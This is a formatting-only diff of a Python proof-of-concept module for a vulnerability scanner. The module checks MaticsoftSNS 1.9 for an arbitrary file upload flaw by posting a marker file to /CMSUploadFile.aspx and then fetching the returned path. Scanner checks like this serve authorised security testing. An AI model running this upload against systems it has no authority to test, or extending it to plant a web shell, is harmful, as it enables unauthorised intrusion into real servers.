@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'MaticsoftSNS_0001' # 平台漏洞编号，留空
+    vuln_id = 'MaticsoftSNS_0001'  # 平台漏洞编号，留空
     name = 'MaticsoftSNS 1.9 任意文件上传'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = '2015-09-07'  # 漏洞公布时间
     desc = '''
         MaticsoftSNS 1.9版本 /CMSUploadFile.aspx 页面任意文件上传漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'MaticsoftSNS'  # 漏洞应用名称
     product_version = 'MaticsoftSNS 1.9版本'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '3d445b6e-a603-4aab-934f-c7bd96df8851'
@@ -31,9 +33,9 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-        
-            #Refer http://www.wooyun.org/bugs/wooyun-2015-0137397
-            hh = hackhttp.hackhttp()    
+
+            # Refer http://www.wooyun.org/bugs/wooyun-2015-0137397
+            hh = hackhttp.hackhttp()
             raw = '''
 POST /CMSUploadFile.aspx HTTP/1.1
 Host: localhost
@@ -55,11 +57,12 @@ testvul_uploadfile_test
             # proxy=('127.0.0.1',1234)
             # code, head,res, errcode, _ = curl.curl2(url,proxy=proxy,raw=raw)
             code1, head1, res1, errcode1, _url1 = hh.http(url, raw=raw)
-            shell_path = re.sub(r'1\||\{0\}','', res1)
-            code2, head2, res2, errcode2, _url2 = hh.http(self.target + shell_path)
+            shell_path = re.sub(r'1\||\{0\}', '', res1)
+            code2, head2, res2, errcode2, _url2 = hh.http(
+                self.target + shell_path)
 
-            if code2 == 200 and 'testvul_uploadfile_test' in res2: 
-                #security_hole(url)
+            if code2 == 200 and 'testvul_uploadfile_test' in res2:
+                # security_hole(url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -68,6 +71,7 @@ testvul_uploadfile_test
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
